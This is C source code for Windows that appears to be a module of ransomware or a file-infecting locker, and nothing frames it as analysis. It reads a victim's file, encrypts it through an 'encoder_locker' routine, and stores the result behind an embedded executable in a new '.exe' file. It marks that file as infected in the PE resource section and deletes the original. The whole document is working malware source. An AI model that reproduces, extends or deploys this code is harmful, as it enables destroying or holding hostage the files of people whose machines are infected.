
#include <malloc.h>
#include <memory.h>
#include <string.h>

#include <windows.h>

#include "encoder_locker.h"
#include "file_infect.h"
#include "file_lock_exe.h"

unsigned int file_get_end_rsrc(void) {
    PIMAGE_DOS_HEADER dos_header=(PIMAGE_DOS_HEADER)execode;
    PIMAGE_NT_HEADERS nt_header=(PIMAGE_NT_HEADERS)(execode+dos_header->e_lfanew);
    PIMAGE_SECTION_HEADER section_header=(PIMAGE_SECTION_HEADER)((char*)nt_header+sizeof(IMAGE_NT_HEADERS));

    for (unsigned int sections_index=1;sections_index<=nt_header->FileHeader.NumberOfSections;++sections_index) {
        if (!strcmp((const char*)section_header->Name,".rsrc"))
            return section_header->PointerToRawData+section_header->SizeOfRawData;
        ++section_header;
    }
    return -1;
}

void file_set_infect_flag(void) {
    PIMAGE_DOS_HEADER dos_header=(PIMAGE_DOS_HEADER)execode;
    PIMAGE_NT_HEADERS nt_header=(PIMAGE_NT_HEADERS)(execode+dos_header->e_lfanew);
    PIMAGE_SECTION_HEADER section_header=(PIMAGE_SECTION_HEADER)((char*)nt_header+sizeof(IMAGE_NT_HEADERS));

    for (unsigned int sections_index=1;sections_index<=nt_header->FileHeader.NumberOfSections;++sections_index) {
        if (!strcmp((const char*)section_header->Name,".rsrc")) {
            *(execode+section_header->PointerToRawData+section_header->SizeOfRawData-1)=FILE_INFECT_FLAG;
            return;
        }
        ++section_header;
    }
}

bool file_is_infect(char* file_path) {
    HANDLE file=CreateFile(file_path,GENERIC_READ,NULL,NULL,OPEN_EXISTING,NULL,NULL);

    if (INVALID_HANDLE_VALUE!=file) {
        unsigned long read_file_size=GetFileSize(file,NULL);
        char* buffer=(char*)malloc(read_file_size);
        
        if (NULL!=buffer) {
            unsigned long output_read_length=0;
            ReadFile(file,buffer,read_file_size,&output_read_length,NULL);

            PIMAGE_DOS_HEADER dos_header=(PIMAGE_DOS_HEADER)buffer;
            PIMAGE_NT_HEADERS nt_header=(PIMAGE_NT_HEADERS)(buffer+dos_header->e_lfanew);
            PIMAGE_SECTION_HEADER section_header=(PIMAGE_SECTION_HEADER)((char*)nt_header+sizeof(IMAGE_NT_HEADERS));

            for (unsigned int sections_index=1;sections_index<=nt_header->FileHeader.NumberOfSections;++sections_index) {
                if (!strcmp((const char*)section_header->Name,".rsrc")) {
                    char flag=FILE_INFECT_FLAG;
                    if (flag==*(char*)(buffer+section_header->PointerToRawData+section_header->SizeOfRawData-1)) {
                        free(buffer);
                        CloseHandle(file);
                        return true;
                    }
                }
                ++section_header;
            }
            free(buffer);
        }
        CloseHandle(file);
    }
    return false;
}

void file_makefile(char* file_path,unsigned char* file_data,unsigned long file_data_length) {
    unsigned int path_length=strlen(file_path);
    char         path[512]={0};
    memcpy(path,file_path,path_length);
    memcpy((void*)(path+path_length),".exe",4);

    HANDLE new_file=CreateFile(path,GENERIC_WRITE,NULL,NULL,OPEN_ALWAYS,NULL,NULL);

    if (INVALID_HANDLE_VALUE!=new_file) {
        unsigned long output_write_length=0;
        unsigned int  end_offset=file_get_end_rsrc();
        file_set_infect_flag();
        WriteFile(new_file,execode,sizeof(execode),&output_write_length,NULL);
        SetFilePointer(new_file,end_offset,NULL,FILE_BEGIN);
        WriteFile(new_file,file_data,file_data_length,&output_write_length,NULL);
        CloseHandle(new_file);
        DeleteFile(file_path);
    }
}

void file_infect(char* file_path,char* output_decrypt_file_md5) {
    HANDLE file=CreateFile(file_path,GENERIC_READ,NULL,NULL,OPEN_EXISTING,NULL,NULL);

    if (INVALID_HANDLE_VALUE!=file) {
        unsigned long file_size=GetFileSize(file,NULL);
        char* file_buffer=(char*)malloc(file_size);

        if (NULL!=file_buffer) {
            unsigned long file_read_point=0;
            unsigned long file_read_length=0;
            ReadFile(file,(LPVOID)file_buffer,file_size,&file_read_length,NULL);

            locker_output output;
            encoder_locker((unsigned char*)file_buffer,file_size,&output);
            memcpy(output_decrypt_file_md5,output.lock_md5,16);
            CloseHandle(file);
            file_makefile(file_path,(unsigned char *)output.output_buffer,output.output_buffer_length);

            if (NULL!=output.output_buffer)
                free(output.output_buffer);
            free(file_buffer);
            return ;
        }
        CloseHandle(file);
    }
}
